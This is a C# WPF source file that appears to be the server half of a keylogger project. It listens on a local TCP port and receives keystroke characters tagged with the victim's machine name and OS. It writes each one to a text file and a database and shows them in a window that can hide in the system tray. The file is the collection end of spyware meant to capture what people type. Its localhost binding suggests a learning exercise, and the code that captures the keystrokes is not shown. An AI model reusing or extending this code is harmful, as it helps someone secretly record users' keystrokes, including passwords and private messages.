using KeyLogger;
using System;
using System.Collections.ObjectModel;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Xml.Serialization;

namespace Server
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        StreamReader reader;
        StreamWriter writer;
        TcpClient tcp = new TcpClient();
        TcpListener listener = new TcpListener(IPAddress.Parse("127.0.0.1"),10000);
        CancellationTokenSource source;
        Task recieveTask;
        PackegeContext db = new PackegeContext();
        ObservableCollection<Package> packages = new ObservableCollection<Package>();
        System.Windows.Forms.NotifyIcon ni = new System.Windows.Forms.NotifyIcon();
        XmlSerializer formatter = new XmlSerializer(typeof(Package));

        public MainWindow()
        {
            ni.Icon = new System.Drawing.Icon("gato_icon_134883 (1).ico");

            InitializeComponent();
            DataContext = this;
            listener.Start();


            Task t = new Task(connectTcp);
            t.Start();

            
        }
       
       

        public ObservableCollection<Package> Packages => packages;

        public void connectTcp()
        {
            tcp = listener.AcceptTcpClientAsync().Result;
            CreateReceiveTask();
        }
        private async void CreateReceiveTask()
        {
            var ns = tcp.GetStream();
            reader = new StreamReader(ns);
            writer = new StreamWriter(ns);
            source = new CancellationTokenSource();
            writer.AutoFlush = true;
            recieveTask = Task.Factory.StartNew(() => { Receved(source.Token); });

        }
        private async void Receved(CancellationToken token)
        {
            while (true)
            {
                if (token.IsCancellationRequested)
                {
                    break;
                }
                var buf = new byte[1024];
                var amount = tcp.Client.Receive(buf);

                var s = Encoding.UTF8.GetString(buf, 0, amount);
                var ss = s.Split(new char[] { ';' }, StringSplitOptions.RemoveEmptyEntries);
                var pt = (PackageType)Convert.ToInt32(ss[0]);

                switch (pt)
                {
                    case PackageType.Send:
                        {                         
                            var p = new Package() { Char = ss[1], Date = DateTime.Now.ToLongTimeString(), MachineName = ss[2], OS = ss[3] };
                            File.AppendAllText("File.txt", ss[1] + " " + DateTime.Now.ToLongTimeString() + " " + ss[2] + " " + ss[3] + "\n");                          
                            await Dispatcher.InvokeAsync(() => { packages.Add(p); });                                                  
                            db.Packages.Add(p);
                            await db.SaveChangesAsync();                                               
                        }
                        break;
                }
            }
        }

        private void Hide_Click(object sender, RoutedEventArgs e)
        {
            ni.Visible = true;
            ni.DoubleClick += (sndr, args) =>
            {
                this.Show();
                this.WindowState = WindowState.Normal;
            };
            this.Hide();
        }

        private async void Show_Click(object sender, RoutedEventArgs e)
        {
            foreach (var item in db.Packages)
            {
                var p = new Package() { Char = item.Char, Date = item.Date, MachineName = item.MachineName, OS = item.OS};
               
                await Dispatcher.InvokeAsync(() => { packages.Add(p); });
            }
        }

        private async void Button_Click_2(object sender, RoutedEventArgs e)
        {
            foreach (var item in db.Packages)
            {
                var p = new Package() { Char = item.Char, Date = item.Date, MachineName = item.MachineName, OS = item.OS };               

                await Dispatcher.InvokeAsync(() => { packages.Remove(p); });                
            }
        }
    }
}
